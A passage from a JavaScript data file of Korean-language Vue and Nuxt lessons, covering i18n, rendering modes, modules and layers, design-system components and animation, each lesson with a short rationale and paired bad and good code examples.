          why: `page1.button3 같은 키는 재사용이 안 되고, 한 단어 키는 문맥이 사라집니다. 영역.의미 두세 단계가 찾기도 재사용도 쉽습니다.`,
          bad: String.raw`
{ "home": { "section2": { "btn1": "자세히" } }, "ok": "확인", "ok2": "확인하기" }
`,
          good: String.raw`
{
  "common": { "confirm": "확인", "cancel": "취소", "more": "자세히" },
  "auth":   { "login": "로그인", "logout": "로그아웃", "error": { "invalid": "아이디 또는 비밀번호가 틀립니다" } },
  "order":  { "status": { "paid": "결제 완료", "shipped": "배송 중" } }
}

// 동적 키는 템플릿 리터럴로
$t(\`order.status.\${order.status}\`)
`,
        },
        {
          id: 'l9', short: `빠진 번역`,
          title: `빠진 키는 조용히 넘기지 말고 개발 중에 드러낸다`,
          why: `번역이 빠지면 키 이름이 그대로 화면에 나옵니다. 개발에서는 경고를 켜 바로 잡고, 빌드에서는 fallback 언어로 채웁니다.`,
          bad: String.raw`
i18n: { vueI18n: { missingWarn: false, fallbackWarn: false } }   // 전부 끄고 모른 체
`,
          good: String.raw`
// i18n.config.ts
export default defineI18nConfig(() => ({
  fallbackLocale: 'ko',
  missingWarn: import.meta.dev,          // 개발에서만 경고
  fallbackWarn: false
}))

// CI: 키 목록 비교 스크립트로 ko.json 과 en.json 의 키가 같은지 검사한다
`,
        },
        {
          id: 'l10', short: `언어 감지`,
          title: `첫 방문은 브라우저 언어로, 선택은 쿠키로 기억`,
          why: `매번 기본 언어로 보내면 사용자가 매번 바꿉니다. 처음에만 브라우저 언어로 보내고 선택을 쿠키에 저장하면 다음 방문부터 그대로입니다.`,
          bad: String.raw`
i18n: { detectBrowserLanguage: false }   // 항상 ko
`,
          good: String.raw`
i18n: {
  detectBrowserLanguage: {
    useCookie: true,
    cookieKey: 'i18n_redirected',
    redirectOn: 'root',        // 루트 접속 때만 감지, 공유된 /en/... 링크는 그대로
    fallbackLocale: 'ko'
  }
}
`,
        },
      ],
    },
    {
      id: 'vue-15', no: 15, name: `렌더링 모드`,
      lead: `SSR, SSG, ISR/SWR, SPA 를 언제 쓰고 어떻게 섞는지에 대한 습관입니다. Nuxt 는 경로별로 다르게 둘 수 있습니다.`,
      lessons: [
        {
          id: 'l1', short: `기본은 SSR`,
          title: `이유 없이 ssr: false 로 끄지 않는다`,
          why: `SSR 을 끄면 첫 화면이 빈 HTML 이라 검색 노출과 첫 표시가 느려집니다. 하이드레이션 오류를 피하려고 끄는 것은 원인을 덮는 것입니다. 관리자 화면처럼 꼭 필요한 경로만 끕니다.`,
          bad: String.raw`
// nuxt.config.ts
export default defineNuxtConfig({ ssr: false })   // 하이드레이션 경고 몇 개 때문에 전체를 SPA 로
`,
          good: String.raw`
export default defineNuxtConfig({
  routeRules: {
    '/admin/**': { ssr: false }      // 로그인 뒤에만 쓰는 관리자 화면만 SPA
  }
})
// 하이드레이션 경고는 <ClientOnly> 나 onMounted 로 원인을 고친다 (10회차 08번)
`,
        },
        {
          id: 'l2', short: `prerender`,
          title: `바뀌지 않는 페이지는 빌드 때 미리 만든다`,
          why: `소개, 약관, 블로그 글처럼 요청마다 같은 페이지를 매번 서버 렌더링할 이유가 없습니다. prerender 하면 CDN 에서 바로 나갑니다.`,
          bad: String.raw`
// 약관 페이지도 요청마다 SSR
`,
          good: String.raw`
routeRules: {
  '/': { prerender: true },
  '/about': { prerender: true },
  '/terms': { prerender: true },
  '/blog/**': { prerender: true }        // 빌드 때 링크를 따라가며 생성
}
// 또는 nitro: { prerender: { routes: ['/sitemap.xml'], crawlLinks: true } }
`,
        },
        {
          id: 'l3', short: `swr / isr`,
          title: `자주 안 바뀌지만 가끔 바뀌는 페이지는 swr`,
          why: `상품 목록은 몇 분 전 것을 보여 줘도 되지만 빌드마다 다시 만들 수는 없습니다. swr 은 캐시된 HTML 을 주고 만료 뒤 백그라운드에서 새로 만듭니다.`,
          bad: String.raw`
// 상품 목록을 매 요청 SSR: DB 를 매번 친다
// 또는 prerender: 상품이 바뀌면 재배포
`,
          good: String.raw`
routeRules: {
  '/products': { swr: 600 },             // 10분. 만료 뒤 첫 요청은 옛 HTML, 뒤에서 갱신
  '/products/**': { swr: 3600 },
  '/news': { isr: 60 }                   // 플랫폼(Vercel, Netlify 등) 의 ISR 캐시 사용
}
`,
          note: `swr 은 Nitro 서버 캐시, isr 은 호스팅 플랫폼의 CDN 캐시입니다. 자체 Node 서버면 swr 을 씁니다.`,
        },
        {
          id: 'l4', short: `generate`,
          title: `완전 정적 사이트는 nuxi generate, 동적 경로는 목록을 준다`,
          why: `generate 는 링크를 따라가며 페이지를 만듭니다. 링크로 닿지 않는 동적 경로(/posts/123)는 목록을 알려 줘야 빠지지 않습니다.`,
          bad: String.raw`
npx nuxi generate
# /posts/123 이 어디서도 링크되지 않아 404
`,
          good: String.raw`
// nuxt.config.ts
nitro: {
  prerender: {
    crawlLinks: true,
    routes: ['/sitemap.xml']
  }
},
hooks: {
  async 'prerender:routes'(ctx) {
    const posts = await fetch('https://cms/posts').then(r => r.json())
    for (const p of posts) ctx.routes.add('/posts/' + p.slug)
  }
}
`,
        },
        {
          id: 'l5', short: `클라이언트 전용`,
          title: `브라우저 API 가 필요한 컴포넌트는 .client.vue 또는 ClientOnly`,
          why: `차트, 지도, 에디터는 window 를 바로 씁니다. 서버에서 import 되는 순간 터집니다. 파일 이름에 .client 를 붙이면 서버 번들에서 빠집니다.`,
          bad: String.raw`
// components/MapView.vue
import maplibregl from 'maplibre-gl'      // 서버에서 window is not defined
`,
          good: String.raw`
// components/MapView.client.vue   → 서버에서는 렌더링되지 않는다
import maplibregl from 'maplibre-gl'

<!-- 또는 쓰는 쪽에서 -->
<ClientOnly>
  <MapView />
  <template #fallback><div class="map-skeleton" /></template>
</ClientOnly>
`,
        },
        {
          id: 'l6', short: `서버 전용 컴포넌트`,
          title: `정적 HTML 만 내는 무거운 컴포넌트는 .server.vue`,
          why: `마크다운 렌더링, 구문 강조처럼 서버에서 한 번 만들면 되는 HTML 을 클라이언트에 라이브러리째 보낼 이유가 없습니다. 서버 컴포넌트는 결과 HTML 만 내려갑니다.`,
          bad: String.raw`
// components/Markdown.vue: 300KB 마크다운 파서가 클라이언트 번들에
`,
          good: String.raw`
// components/Markdown.server.vue
<script setup lang="ts">
import { marked } from 'marked'
const props = defineProps<{ source: string }>()
const html = marked(props.source)
</script>
<template><div v-html="html" /></template>
// 클라이언트에는 결과 HTML 만 간다. 상호작용이 필요한 부분은 자식에 .client 컴포넌트를 둔다
`,
          note: `서버 컴포넌트는 <code>experimental.componentIslands</code> 설정이 필요할 수 있습니다. 버전에 따라 기본 활성 여부가 다릅니다.`,
        },
        {
          id: 'l7', short: `요청 정보`,
          title: `서버 렌더링 중 요청 정보는 useRequestHeaders, useRequestEvent`,
          why: `SSR 중 $fetch 는 브라우저 쿠키를 자동으로 넘기지 않습니다. 사용자별 API 를 서버에서 부를 때는 요청의 쿠키를 직접 넘겨야 합니다.`,
          bad: String.raw`
const { data } = await useFetch('https://api.example.com/me')   // 외부 API: SSR 에서 쿠키 없이 간다
`,
          good: String.raw`
const headers = useRequestHeaders(['cookie'])
const { data } = await useFetch('https://api.example.com/me', { headers })

// 내부 /api/** 는 useFetch 가 SSR 중 직접 호출(네트워크 없이)하며 쿠키가 전달된다
// 서버에서만 되는 것: const event = useRequestEvent()   (클라이언트에서는 undefined)
`,
        },
        {
          id: 'l8', short: `페이로드`,
          title: `페이로드에 못 담는 값은 넣지 않는다`,
          why: `useState 와 useFetch 결과는 JSON 비슷한 형식으로 HTML 에 실립니다. Date, Map, 클래스 인스턴스, 함수는 깨지거나 경고가 납니다.`,
          bad: String.raw`
const state = useState('cfg', () => ({ at: new Date(), fmt: (n) => n + '원', map: new Map() }))
`,
          good: String.raw`
const state = useState('cfg', () => ({ at: new Date().toISOString() }))
// Date 는 문자열로 두고 쓰는 곳에서 new Date(state.value.at)
// 함수는 상태가 아니라 utils/ 에

// 꼭 필요하면 payload 플러그인으로 직렬화를 정의한다 (definePayloadPlugin, definePayloadReducer)
`,
        },
        {
          id: 'l9', short: `하이브리드 점검`,
          title: `경로별 렌더링 모드는 표로 정리해 두고 nuxi analyze 로 확인`,
          why: `routeRules 가 늘어나면 어느 페이지가 어떤 방식인지 아무도 모르게 됩니다. 표 하나로 정리하고, 빌드 결과의 prerender 목록을 확인합니다.`,
          bad: String.raw`
// routeRules 가 30줄, 겹치는 패턴 ('/blog/**' 와 '/blog/draft/**') 이 어느 쪽이 이기는지 아무도 모른다
`,
          good: String.raw`
// docs/rendering.md 로 관리하고 routeRules 는 그 표를 옮긴 것
// | 경로            | 방식       | 이유                      |
// | /               | prerender  | 랜딩, 배포 때 갱신        |
// | /products/**    | swr 1h     | 수시로 바뀜, 검색 노출     |
// | /me/**          | ssr        | 사용자별                   |
// | /admin/**       | spa        | 로그인 뒤 전용             |

// 구체적 패턴을 아래에: Nitro 는 더 구체적인 규칙이 우선
routeRules: { '/blog/**': { swr: 3600 }, '/blog/draft/**': { ssr: true, swr: false } }
`,
        },
        {
          id: 'l10', short: `SPA 로딩`,
          title: `SPA 경로의 첫 화면은 spaLoadingTemplate 로`,
          why: `ssr: false 경로는 JS 가 받아지기 전까지 하얀 화면입니다. 로딩 템플릿을 두면 레이아웃 골격이라도 먼저 보입니다.`,
          bad: String.raw`
'/admin/**': { ssr: false }      // 2초간 빈 화면
`,
          good: String.raw`
// app/spa-loading-template.html (Nuxt 3: 프로젝트 루트의 spa-loading-template.html)
<div class="app-skeleton">
  <div class="skeleton-nav"></div>
  <div class="skeleton-body"></div>
</div>

// nuxt.config.ts
spaLoadingTemplate: true
`,
        },
      ],
    },
    {
      id: 'vue-16', no: 16, name: `Nuxt 모듈과 레이어`,
      lead: `여러 프로젝트가 공유할 설정, 컴포넌트, 서버 로직을 모듈과 레이어로 묶는 습관입니다.`,
      lessons: [
        {
          id: 'l1', short: `모듈 vs 레이어`,
          title: `기능 추가는 모듈, 프로젝트 골격 공유는 레이어`,
          why: `모듈은 빌드 시점에 훅으로 기능을 끼우는 코드이고, 레이어는 Nuxt 프로젝트 전체(pages, components, config)를 상속하는 것입니다. 용도가 다릅니다.`,
          bad: String.raw`
// 회사 공통 헤더, 테마, 인증 미들웨어를 npm 패키지로 묶어 플러그인 한 개에 전부 넣는다
// → 페이지와 레이아웃은 못 넣고, 설정 병합도 안 된다
`,
          good: String.raw`
// 레이어: 공통 레이아웃, 페이지, 설정, 컴포넌트를 통째로 상속
// nuxt.config.ts
export default defineNuxtConfig({
  extends: ['@company/nuxt-base', './layers/admin']
})

// 모듈: 빌드 훅으로 기능을 추가 (플러그인 주입, 컴포넌트 등록, 서버 라우트 추가)
modules: ['@company/nuxt-analytics']
`,
        },
        {
          id: 'l2', short: `모듈 뼈대`,
          title: `모듈은 defineNuxtModule + createResolver`, ver: `@nuxt/kit`,
          why: `모듈 안에서 상대 경로를 그대로 쓰면 설치 위치에 따라 깨집니다. createResolver 로 모듈 파일 기준 경로를 만들고, addPlugin 같은 kit 함수로 등록합니다.`,
          bad: String.raw`
export default function (options, nuxt) {
  nuxt.options.plugins.push('./runtime/plugin')    // 상대 경로: 사용 프로젝트에서 못 찾는다
}
`,
          good: String.raw`
// src/module.ts
import { defineNuxtModule, addPlugin, addComponentsDir, createResolver } from '@nuxt/kit'

export default defineNuxtModule<{ siteId: string }>({
  meta: { name: 'my-analytics', configKey: 'analytics' },
  defaults: { siteId: '' },
  setup(options, nuxt) {
    const { resolve } = createResolver(import.meta.url)
    nuxt.options.runtimeConfig.public.analytics = { siteId: options.siteId }
    addPlugin(resolve('./runtime/plugin.client'))
    addComponentsDir({ path: resolve('./runtime/components') })
  }
})
`,
        },
        {
          id: 'l3', short: `런타임 분리`,
          title: `모듈 코드와 런타임 코드를 나눈다`,
          why: `module.ts 는 빌드 때 Node 에서 돌고, runtime/ 은 앱 번들에 들어가 브라우저와 서버에서 돕니다. 섞으면 Node 전용 API 가 브라우저 번들에 들어갑니다.`,
          bad: String.raw`
// module.ts 안에 플러그인 로직까지
setup() {
  nuxt.hook('app:mounted', () => window.gtag(...))   // 빌드 시점엔 window 가 없다
}
`,
          good: String.raw`
src/
  module.ts               # 빌드 시점: 등록만 한다
  runtime/
    plugin.client.ts      # 앱 시점: 실제 동작
    components/
    server/api/track.post.ts

// runtime/plugin.client.ts
export default defineNuxtPlugin(() => {
  const { siteId } = useRuntimeConfig().public.analytics
  ...
})
`,
        },
        {
          id: 'l4', short: `서버 핸들러 추가`,
          title: `모듈이 API 를 제공하려면 addServerHandler`,
          why: `모듈 사용자에게 "server/api 에 이 파일을 복사하세요" 라고 하면 버전이 어긋납니다. 모듈이 직접 서버 라우트를 등록합니다.`,
          bad: String.raw`
// README: "server/api/track.post.ts 를 복사해서 넣으세요"
`,
          good: String.raw`
import { addServerHandler } from '@nuxt/kit'

setup(options, nuxt) {
  const { resolve } = createResolver(import.meta.url)
  addServerHandler({ route: '/api/_analytics/track', method: 'post', handler: resolve('./runtime/server/track') })
  addImports({ name: 'useTrack', from: resolve('./runtime/composables/useTrack') })   // 자동 import 등록
}
`,
        },
        {
          id: 'l5', short: `레이어 구조`,
          title: `레이어는 그냥 Nuxt 앱 폴더, 가까운 쪽이 이긴다`,
          why: `레이어도 nuxt.config 와 pages, components 를 가진 Nuxt 프로젝트입니다. extends 순서에서 뒤에 적은 것과 현재 프로젝트가 같은 파일을 덮어씁니다.`,
          bad: String.raw`
// 베이스 레이어의 components/AppHeader.vue 를 고치려고 레이어 패키지 소스를 직접 수정
`,
          good: String.raw`
// layers/base/   nuxt.config.ts, layouts/default.vue, components/AppHeader.vue, composables/useAuth.ts
// 프로젝트/       nuxt.config.ts (extends: ['./layers/base']), components/AppHeader.vue  ← 이쪽이 쓰인다

// 설정은 병합된다: 레이어의 modules 와 프로젝트의 modules 가 합쳐지고, 같은 키는 프로젝트가 이긴다
`,
        },
        {
          id: 'l6', short: `경로 별칭`,
          title: `레이어 안에서는 ~ 대신 상대 경로나 레이어 별칭`,
          why: `~ 와 @ 는 "현재 프로젝트" 를 가리킵니다. 레이어 코드가 ~/utils 를 import 하면 레이어가 아니라 쓰는 프로젝트의 utils 를 찾아 깨집니다.`,
          bad: String.raw`
// layers/base/components/Price.vue
import { formatMoney } from '~/utils/money'     // 쓰는 프로젝트에 money.ts 가 없으면 실패
`,
          good: String.raw`
// layers/base/components/Price.vue
import { formatMoney } from '../utils/money'    // 레이어 안 상대 경로

// 또는 레이어 nuxt.config 에서 별칭을 정의
const { resolve } = createResolver(import.meta.url)
export default defineNuxtConfig({ alias: { '#base': resolve('./') } })
import { formatMoney } from '#base/utils/money'
`,
        },
        {
          id: 'l7', short: `설정 옵션`,
          title: `모듈 옵션은 configKey 로 받고 runtimeConfig 로 넘긴다`,
          why: `옵션을 코드에 문자열로 치환해 넣으면 환경마다 다시 빌드해야 합니다. runtimeConfig 로 넘기면 NUXT_ 환경 변수로 덮을 수 있습니다.`,
          bad: String.raw`
addTemplate({ filename: 'analytics.mjs', getContents: () => 'export const id = "' + options.siteId + '"' })
// 환경마다 빌드
`,
          good: String.raw`
// nuxt.config.ts (사용 측)
analytics: { siteId: 'G-XXXX' }

// module.ts
setup(options, nuxt) {
  nuxt.options.runtimeConfig.public.analytics = defu(nuxt.options.runtimeConfig.public.analytics, options)
}
// 배포 환경: NUXT_PUBLIC_ANALYTICS_SITE_ID=G-YYYY 로 덮는다
`,
        },
        {
          id: 'l8', short: `타입 제공`,
          title: `모듈이 추가한 컴포저블과 설정에 타입을 붙인다`,
          why: `addImports 로 넣은 함수는 자동 import 되지만, runtimeConfig 에 넣은 값은 타입이 없습니다. 모듈이 d.ts 를 함께 내보내야 사용자가 자동 완성을 받습니다.`,
          bad: String.raw`
useRuntimeConfig().public.analytics.siteId      // any
`,
          good: String.raw`
// src/module.ts 안
declare module '@nuxt/schema' {
  interface PublicRuntimeConfig { analytics: { siteId: string } }
}
// 모듈 빌드(nuxt-module-build) 가 types.d.ts 로 내보낸다
`,
        },
        {
          id: 'l9', short: `플레이그라운드`,
          title: `모듈 저장소에는 playground 와 테스트를 둔다`,
          why: `모듈을 고칠 때마다 실제 프로젝트에 설치해 보면 느립니다. 모듈 템플릿의 playground/ 가 바로 띄우는 샘플 앱이고, @nuxt/test-utils 로 빌드까지 검증합니다.`,
          bad: String.raw`
npm publish 하고 회사 프로젝트에서 npm update 로 확인
`,
          good: String.raw`
npx nuxi init -t module my-module      # 템플릿: src/, playground/, test/
npm run dev                            # playground 가 모듈을 물고 뜬다

// test/basic.test.ts
import { setup, $fetch } from '@nuxt/test-utils/e2e'
await setup({ rootDir: fileURLToPath(new URL('./fixtures/basic', import.meta.url)) })
it('renders', async () => { expect(await $fetch('/')).toContain('<div>basic</div>') })
`,
          lang: { bad: 'plain' },
        },
        {
          id: 'l10', short: `훅`,
          title: `앱 동작은 nuxt 훅이 아니라 런타임 훅`,
          why: `nuxt.hook('pages:extend') 같은 빌드 훅과 nuxtApp.hook('app:mounted') 같은 런타임 훅은 다른 세계입니다. 라우트 목록을 바꾸는 건 빌드 훅, 페이지 전환마다 하는 일은 런타임 훅입니다.`,
          bad: String.raw`
// plugins/foo.ts 에서 빌드 훅을 쓰려고 함
nuxt.hook('pages:extend', ...)          // 플러그인에는 nuxt(빌더) 가 없다
`,
          good: String.raw`
// 빌드 훅: nuxt.config.ts 나 모듈에서
hooks: {
  'pages:extend'(pages) { pages.push({ name: 'legacy', path: '/old/:id', file: '~/pages/users/[id].vue' }) }
}

// 런타임 훅: 플러그인에서
export default defineNuxtPlugin((nuxtApp) => {
  nuxtApp.hook('page:finish', () => { window.scrollTo(0, 0) })
  nuxtApp.hook('vue:error', (err) => report(err))
})
`,
        },
      ],
    },
    {
      id: 'vue-17', no: 17, name: `UI 라이브러리와 디자인 시스템`,
      lead: `컴포넌트 라이브러리를 고르고, 토큰으로 스타일을 통일하고, 공통 컴포넌트를 설계하는 습관입니다.`,
      lessons: [
        {
          id: 'l1', short: `라이브러리 선택`,
          title: `라이브러리는 커스터마이징 범위로 고른다`,
          why: `기성 디자인을 그대로 쓸 거면 완성형(Vuetify, Element Plus, PrimeVue), 디자인이 따로 있으면 헤드리스(Reka UI, Headless UI) 나 복사형(shadcn-vue) 이 맞습니다. 섞어 쓰면 두 벌의 스타일을 싸워야 합니다.`,
          bad: String.raw`
// 완성형 라이브러리를 깔고 모든 컴포넌트를 :deep() 으로 덮어쓴다
.el-button { border-radius: 0 !important; background: var(--brand) !important; ... }
`,
          good: String.raw`
// 디자인 시스템이 있다면: 헤드리스 + 우리 스타일
import { DialogRoot, DialogContent } from 'reka-ui'      // 동작과 접근성만 제공
// 또는 Nuxt UI (Tailwind 기반, app.config 로 테마)
// 또는 shadcn-vue: 컴포넌트 소스를 프로젝트에 복사해 마음대로 고친다
`,
        },
        {
          id: 'l2', short: `토큰`,
          title: `색, 간격, 글꼴은 CSS 변수 토큰으로`,
          why: `#1f5fbf 가 50군데 박혀 있으면 브랜드 색을 바꿀 때 50군데를 찾아야 하고 다크 모드도 못 만듭니다. 토큰 한 벌을 두고 모든 컴포넌트가 그것만 씁니다.`,
          bad: String.raw`
.btn { background: #1f5fbf; padding: 8px 16px; border-radius: 6px; font-size: 14px; }
.card { border: 1px solid #dde2ea; border-radius: 6px; }
`,
          good: String.raw`
/* assets/tokens.css */
:root {
  --color-primary: #1f5fbf; --color-line: #dde2ea; --color-fg: #1c2230;
  --space-2: 8px; --space-4: 16px;
  --radius-md: 6px; --text-sm: 14px;
}
:root[data-theme="dark"] { --color-line: #2a3140; --color-fg: #e6e9ef; }

.btn { background: var(--color-primary); padding: var(--space-2) var(--space-4); border-radius: var(--radius-md); }
`,
        },
        {
          id: 'l3', short: `Tailwind 토큰`,
          title: `Tailwind 를 쓰면 토큰을 테마에 등록하고 임의 값은 피한다`,
          why: `bg-[#1f5fbf] 같은 임의 값은 토큰이 아니라 하드코딩입니다. 테마에 primary 로 등록하면 bg-primary 로 쓰고 다크 모드도 한 곳에서 바뀝니다.`,
          bad: String.raw`
<button class="bg-[#1f5fbf] px-[16px] rounded-[6px] text-[14px]">
`,
          good: String.raw`
/* Tailwind 4: CSS 로 테마 */
@theme {
  --color-primary: #1f5fbf;
  --radius-md: 6px;
}
<button class="bg-primary px-4 rounded-md text-sm">
`,
        },
        {
          id: 'l4', short: `Base 컴포넌트`,
          title: `원시 요소는 Base 컴포넌트로 감싸 variant 를 둔다`,
          why: `button 에 클래스를 매번 조합하면 같은 버튼이 열 가지 모양이 됩니다. BaseButton 이 variant 와 size 를 받고 나머지 속성은 그대로 넘깁니다.`,
          bad: String.raw`
<button class="btn btn-primary btn-lg rounded shadow">저장</button>
<button class="btn primary large">저장</button>        <!-- 다른 사람이 쓴 같은 버튼 -->
`,
          good: String.raw`
<!-- components/BaseButton.vue -->
<script setup lang="ts">
const { variant = 'primary', size = 'md' } = defineProps<{
  variant?: 'primary' | 'secondary' | 'danger'
  size?: 'sm' | 'md' | 'lg'
  loading?: boolean
}>()
</script>
<template>
  <button class="btn" :class="['btn-' + variant, 'btn-' + size]" :disabled="loading || $attrs.disabled">
    <Spinner v-if="loading" /><slot />
  </button>
</template>

<BaseButton variant="danger" size="sm" @click="remove">삭제</BaseButton>
`,
        },
        {
          id: 'l5', short: `class 병합`,
          title: `Tailwind 클래스는 cva + tailwind-merge 로 조합한다`,
          why: `variant 별 클래스를 문자열로 이어 붙이면 px-4 와 px-6 이 둘 다 남아 뒤에 온 것이 우연히 이깁니다. cva 가 variant 를 정리하고 tailwind-merge 가 충돌을 풉니다.`,
          bad: String.raw`
const cls = 'px-4 py-2 rounded ' + (size === 'lg' ? 'px-6 py-3' : '') + ' ' + attrs.class
// 'px-4 ... px-6' 둘 다 남는다
`,
          good: String.raw`
import { cva } from 'class-variance-authority'
import { twMerge } from 'tailwind-merge'

const button = cva('inline-flex items-center rounded font-medium', {
  variants: {
    variant: { primary: 'bg-primary text-white', secondary: 'bg-gray-100 text-gray-900' },
    size: { sm: 'px-3 py-1 text-sm', md: 'px-4 py-2', lg: 'px-6 py-3 text-lg' }
  },
  defaultVariants: { variant: 'primary', size: 'md' }
})
const cls = computed(() => twMerge(button({ variant, size }), attrs.class as string))
`,
        },
        {
          id: 'l6', short: `접근성 내장`,
          title: `Dialog, Menu, Tabs 는 직접 만들지 말고 헤드리스를 쓴다`,
          why: `모달 하나에도 포커스 가두기, Esc 닫기, aria 역할, 스크롤 잠금이 필요합니다. 직접 만들면 하나는 빠집니다. 헤드리스 라이브러리는 그 동작만 제공하고 스타일은 비워 둡니다.`,
          bad: String.raw`
<div v-if="open" class="overlay" @click="open = false">
  <div class="modal" @click.stop>...</div>        <!-- Esc 안 됨, 포커스 안 갇힘, 역할 없음 -->
</div>
`,
          good: String.raw`
<script setup>
import { DialogRoot, DialogTrigger, DialogPortal, DialogOverlay, DialogContent, DialogTitle, DialogClose } from 'reka-ui'
</script>
<DialogRoot v-model:open="open">
  <DialogTrigger class="btn">열기</DialogTrigger>
  <DialogPortal>
    <DialogOverlay class="overlay" />
    <DialogContent class="modal">
      <DialogTitle>제목</DialogTitle>
      <slot />
      <DialogClose class="btn">닫기</DialogClose>
    </DialogContent>
  </DialogPortal>
</DialogRoot>
`,
        },
        {
          id: 'l7', short: `아이콘`,
          title: `아이콘은 SVG 폰트가 아니라 컴포넌트/스프라이트`,
          why: `아이콘 폰트는 전체를 받고, 깨지면 네모가 나오며 접근성도 나쁩니다. 쓰는 아이콘만 SVG 로 번들하거나 Nuxt Icon 으로 필요한 것만 가져옵니다.`,
          bad: String.raw`
<link href="font-awesome.css">      <!-- 1,500 개 아이콘 폰트 전부 -->
<i class="fa fa-user"></i>
`,
          good: String.raw`
<!-- @nuxt/icon: Iconify 컬렉션에서 쓰는 것만, 서버에서 SVG 로 -->
<Icon name="lucide:user" size="20" />

<!-- 또는 unplugin-icons 로 컴포넌트 import -->
import IconUser from '~icons/lucide/user'
<IconUser aria-hidden="true" /><span class="sr-only">사용자</span>
`,
        },
        {
          id: 'l8', short: `다크 모드`,
          title: `다크 모드는 토큰 교체 + color-scheme, 깜빡임 방지`,
          why: `컴포넌트마다 dark: 클래스를 다는 대신 토큰 값만 바꾸면 끝납니다. 선택값은 SSR 에서 읽어야 첫 화면이 깜빡이지 않습니다.`,
          bad: String.raw`
<div :class="dark ? 'bg-gray-900 text-white' : 'bg-white text-black'">   <!-- 모든 요소마다 -->
onMounted(() => { dark.value = localStorage.theme === 'dark' })            <!-- 흰 화면 뒤 검게 -->
`,
          good: String.raw`
// @nuxtjs/color-mode: 쿠키/스토리지에 저장하고 SSR HTML 에 class 를 미리 붙인다
const colorMode = useColorMode()
<button @click="colorMode.preference = colorMode.value === 'dark' ? 'light' : 'dark'">

/* 토큰만 바꾼다 */
.dark-mode { --color-bg: #12161d; --color-fg: #e6e9ef; color-scheme: dark; }
`,
        },
        {
          id: 'l9', short: `문서화`,
          title: `공통 컴포넌트는 Storybook 이나 Histoire 로 카탈로그를 만든다`,
          why: `어떤 variant 가 있고 어떻게 쓰는지 소스를 열어 봐야 안다면 사람들이 새 버튼을 또 만듭니다. 스토리 하나가 문서이자 시각 회귀 테스트입니다.`,
          bad: String.raw`
// components/ 폴더에 BaseButton, AppButton, PrimaryButton, Btn 이 공존
`,
          good: String.raw`
// components/BaseButton.stories.ts
import type { Meta, StoryObj } from '@storybook/vue3'
import BaseButton from './BaseButton.vue'
const meta: Meta<typeof BaseButton> = { component: BaseButton, args: { default: '저장' } }
export default meta
export const Primary: StoryObj<typeof meta> = { args: { variant: 'primary' } }
export const Danger:  StoryObj<typeof meta> = { args: { variant: 'danger' } }
export const Loading: StoryObj<typeof meta> = { args: { loading: true } }
`,
        },
        {
          id: 'l10', short: `폼 컨트롤 일관성`,
          title: `입력 컴포넌트는 defineModel + 같은 props 계약`,
          why: `Input, Select, Textarea 가 각각 다른 prop 이름(value, modelValue, val)을 쓰면 폼 코드가 뒤죽박죽입니다. 모두 defineModel 과 같은 props(label, error, disabled)를 받게 맞춥니다.`,
          bad: String.raw`
<BaseInput :value="name" @change="name = $event" />
<BaseSelect v-model="role" />
<BaseTextarea :text="bio" @update="bio = $event" />
`,
          good: String.raw`
// 모든 폼 컨트롤이 같은 계약: v-model, label, error, disabled, id 는 자동
const model = defineModel<string>({ required: true })
defineProps<{ label: string; error?: string; disabled?: boolean }>()

<BaseInput v-model="name" label="이름" :error="errors.name" />
<BaseSelect v-model="role" label="역할" :options="roles" />
<BaseTextarea v-model="bio" label="소개" />
`,
        },
      ],
    },
    {
      id: 'vue-18', no: 18, name: `애니메이션과 인터랙션`,
      lead: `움직임을 넣되 느리거나 어지럽지 않게, 그리고 상태와 어긋나지 않게 하는 습관입니다.`,
      lessons: [
        {
          id: 'l1', short: `무엇을 움직일지`,
          title: `transform 과 opacity 만 움직인다`,
          why: `width, height, top, margin 을 애니메이션하면 매 프레임 레이아웃을 다시 계산해 버벅입니다. transform 과 opacity 는 합성 단계에서 처리되어 GPU 가 맡습니다.`,
          bad: String.raw`
.panel { transition: height .3s, margin-left .3s, width .3s; }
`,
          good: String.raw`
.panel { transition: transform .25s ease, opacity .25s ease; }
.panel.closed { transform: translateX(-100%); opacity: 0; }

/* 높이 변화가 꼭 필요하면 grid 트릭 */
.acc { display: grid; grid-template-rows: 0fr; transition: grid-template-rows .25s; }
.acc.open { grid-template-rows: 1fr; }
.acc > div { overflow: hidden; }
`,
        },
        {
          id: 'l2', short: `reduced motion`,
          title: `prefers-reduced-motion 을 존중한다`,
          why: `움직임에 민감한 사용자는 OS 에서 애니메이션 줄이기를 켭니다. 무시하면 어지러움을 유발합니다. 전역 한 줄로 줄이고, 의미 있는 전환은 페이드로 대체합니다.`,
          bad: String.raw`
/* 설정과 무관하게 항상 큰 움직임 */
.hero { animation: fly-in 1s; }
`,
          good: String.raw`
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation-duration: .01ms !important; transition-duration: .01ms !important; }
}

// JS 에서도
import { usePreferredReducedMotion } from '@vueuse/core'
const reduced = usePreferredReducedMotion()   // 'reduce' | 'no-preference'
const duration = computed(() => reduced.value === 'reduce' ? 0 : 300)
`,
        },
        {
          id: 'l3', short: `Transition 훅`,
          title: `JS 애니메이션은 Transition 의 훅에 연결한다`,
          why: `라이브러리(GSAP, motion) 로 움직이면서 v-if 를 바로 바꾸면 요소가 사라져 애니메이션이 끊깁니다. Transition 의 enter/leave 훅이 done 을 부를 때까지 DOM 을 붙잡습니다.`,
          bad: String.raw`
function close() {
  gsap.to(el, { opacity: 0, duration: .3 })
  open.value = false            // 즉시 사라진다, gsap 는 허공에 대고 돈다
}
`,
          good: String.raw`
<Transition :css="false" @enter="onEnter" @leave="onLeave">
  <div v-if="open" ref="el">...</div>
</Transition>

function onEnter(el, done) { gsap.fromTo(el, { opacity: 0, y: 12 }, { opacity: 1, y: 0, duration: .3, onComplete: done }) }
function onLeave(el, done) { gsap.to(el, { opacity: 0, y: 12, duration: .2, onComplete: done }) }
`,
        },
        {
          id: 'l4', short: `목록 이동`,
          title: `목록 재정렬은 TransitionGroup 의 move 클래스로 FLIP`,
          why: `정렬이 바뀔 때 항목이 순간이동하면 사용자가 어디로 갔는지 놓칩니다. TransitionGroup 은 위치 변화를 계산해(FLIP) transform 으로 부드럽게 옮깁니다.`,
          bad: String.raw`
<ul><li v-for="item in sorted" :key="item.id">{{ item.name }}</li></ul>   <!-- 순간이동 -->
`,
          good: String.raw`
<TransitionGroup tag="ul" name="list">
  <li v-for="item in sorted" :key="item.id">{{ item.name }}</li>
</TransitionGroup>

<style>
.list-move, .list-enter-active, .list-leave-active { transition: all .3s ease; }
